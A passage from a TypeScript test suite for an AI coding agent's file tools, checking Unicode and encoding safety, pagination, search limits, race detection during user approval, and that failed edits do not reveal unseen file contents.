  const controller = new AbortController();
  controller.abort();
  const cancelled = await searchTextTool.run({ query: 'needle' }, { ...ctx, signal: controller.signal });
  assert.match(cancelled.content, /Search was cancelled/);
});

test('append rejects non-UTF-8 files and writes do not overwrite approval-time changes', async () => {
  const root = makeTempWorkspace({ 'bad.txt': 'ok', 'race.txt': 'original' });
  const bytes = Buffer.from([0x66, 0xff]);
  fs.writeFileSync(path.join(root, 'bad.txt'), bytes);
  const bad = await writeFileTool.run({ path: 'bad.txt', content: 'x', mode: 'append' }, makeContext(root, new FakeHost(root)));
  assert.equal(bad.ok, false);
  assert.deepEqual(fs.readFileSync(path.join(root, 'bad.txt')), bytes);
  const host = new FakeHost(root, { onApproval() { fs.writeFileSync(path.join(root, 'race.txt'), 'user changed'); } });
  const race = await writeFileTool.run({ path: 'race.txt', content: 'agent' }, makeContext(root, host));
  assert.equal(race.ok, false);
  assert.match(race.content, /changed since/);
  assert.equal(fs.readFileSync(path.join(root, 'race.txt'), 'utf8'), 'user changed');
});

test('search skip diagnostics separate hidden, ignored, glob, and oversized entries', async () => {
  const root = makeTempWorkspace({ '.hidden.txt': 'x', 'node_modules/skip.txt': 'x', 'small.md': 'x', 'large.txt': 'x'.repeat(100), 'find.txt': 'x' });
  const result = await searchTextTool.run({ query: 'x', glob: '*.txt' }, makeContext(root, new FakeHost(root), { maxFileBytes: 40 }));
  assert.match(result.content, /1 hidden, 1 ignored directories, 1 glob, 1 oversized/);
  assert.match(result.content, /find.txt:1:/);
});

test('read_file refuses non-UTF-8 bytes rather than reporting replacement characters', async () => {
  const root = makeTempWorkspace({ 'bad.txt': 'placeholder' });
  const bytes = Buffer.from([0x61, 0xff, 0x0a]);
  fs.writeFileSync(path.join(root, 'bad.txt'), bytes);
  const result = await readFileTool.run({ path: 'bad.txt' }, makeContext(root, new FakeHost(root)));
  assert.equal(result.ok, false);
  assert.match(result.content, /not valid UTF-8/);
  assert.deepEqual(fs.readFileSync(path.join(root, 'bad.txt')), bytes);
});

test('normalized match offsets map back to untouched mixed-ending text', () => {
  let seed = 1234567;
  const random = (max: number): number => { seed = (seed * 1664525 + 1013904223) >>> 0; return seed % max; };
  const atoms = ['x', 'A', '😀', '\uFEFF', '\r\n', '\n', '\r', '\t'];
  for (let trial = 0; trial < 300; trial++) {
    let original = '';
    for (let i = 0; i < 30; i++) original += atoms[random(atoms.length)];
    const normalized = normalizeEol(original);
    // Independent reference map: one raw offset per UTF-16 boundary.
    const map = [0];
    let logical = '';
    for (let i = 0; i < original.length;) {
      if (original[i] === '\r' && original[i + 1] === '\n') { logical += '\n'; i += 2; }
      else { logical += original[i] === '\r' ? '\n' : original[i]; i++; }
      map.push(i);
    }
    assert.equal(logical, normalized);
    const start = random(normalized.length - 1);
    const needle = normalized.slice(start, Math.min(normalized.length, start + 1 + random(5)));
    let rawCursor = 0;
    let logicalCursor = 0;
    let expected = '';
    for (let count = 0; count < 3; count++) {
      const index = normalized.indexOf(needle, logicalCursor);
      if (index < 0) break;
      expected += original.slice(rawCursor, map[index]) + 'Z';
      rawCursor = map[index + needle.length];
      logicalCursor = index + needle.length;
    }
    expected += original.slice(rawCursor);
    assert.equal(replaceNormalizedPreservingEol(original, needle, 'Z', 3), expected);
  }
});

test('search reports the directory traversal entry limit', async () => {
  const root = makeTempWorkspace();
  for (let i = 0; i < 6002; i++) fs.writeFileSync(path.join(root, `${String(i).padStart(4, '0')}.txt`), 'x');
  const result = await searchTextTool.run({ query: 'not present' }, makeContext(root, new FakeHost(root)));
  assert.match(result.content, /No matches/);
  assert.match(result.content, /6000-entry limit; results may be incomplete/);
});

test('text tools reject unpaired surrogates instead of corrupting Unicode', async () => {
  const root = makeTempWorkspace({ 'unicode.txt': '😀\r\nuntouched' });
  const ctx = makeContext(root, new FakeHost(root));
  const badOld = await replaceInFileTool.run({ path: 'unicode.txt', old_text: '\uD83D', new_text: 'x' }, ctx);
  const badNew = await replaceInFileTool.run({ path: 'unicode.txt', old_text: '😀', new_text: '\uDE00' }, ctx);
  const badWrite = await writeFileTool.run({ path: 'unicode.txt', content: '\uD83D' }, ctx);
  for (const result of [badOld, badNew, badWrite]) {
    assert.equal(result.ok, false);
    assert.match(result.content, /well-formed Unicode/);
  }
  assert.equal(fs.readFileSync(path.join(root, 'unicode.txt'), 'utf8'), '😀\r\nuntouched');
});

test('read_file paginates long Unicode lines without losing text and reports continuation', async () => {
  const line = '😀éZ'.repeat(700);
  const root = makeTempWorkspace({ 'long.txt': `${line}\r\nnext\r\n` });
  const ctx = { ...makeContext(root, new FakeHost(root)), outputTokenBudget: 256 };
  let startLine = 1;
  let startColumn = 1;
  let reconstructed = '';
  let pages = 0;
  while (startLine === 1) {
    const result = await readFileTool.run({ path: 'long.txt', start_line: startLine, start_column: startColumn, end_line: 1 }, ctx);
    assert.equal(result.ok, true);
    const lineText = result.content.split('\n')[1].replace(/^\s*1\| /, '');
    reconstructed += lineText;
    pages++;
    startLine = Number(result.meta?.nextLine ?? 2);
    startColumn = Number(result.meta?.nextColumn ?? 1);
    assert.ok(pages < 100);
  }
  assert.ok(pages > 1);
  assert.equal(reconstructed, line);
  assert.equal(startLine, 2);
  const next = await readFileTool.run({ path: 'long.txt', start_line: startLine, start_column: startColumn }, ctx);
  assert.match(next.content, /2\| next/);
  assert.equal(fs.readFileSync(path.join(root, 'long.txt'), 'utf8'), `${line}\r\nnext\r\n`);
});

test('failed replace suggests bounded locations without exposing unseen file content or editing', async () => {
  const original = 'PRIVATE SECRET\nfirst line unique\nother line\n';
  const root = makeTempWorkspace({ 'file.txt': original });
  const host = new FakeHost(root);
  const ctx = makeContext(root, host);
  const result = await replaceInFileTool.run({ path: 'file.txt', old_text: 'first line unique\nwrong next line', new_text: 'new' }, ctx);
  assert.equal(result.ok, false);
  assert.match(result.content, /near line 2/);
  assert.doesNotMatch(result.content, /PRIVATE SECRET/);
  assert.equal(fs.readFileSync(path.join(root, 'file.txt'), 'utf8'), original);
  assert.equal(host.approvals.length, 0);
});
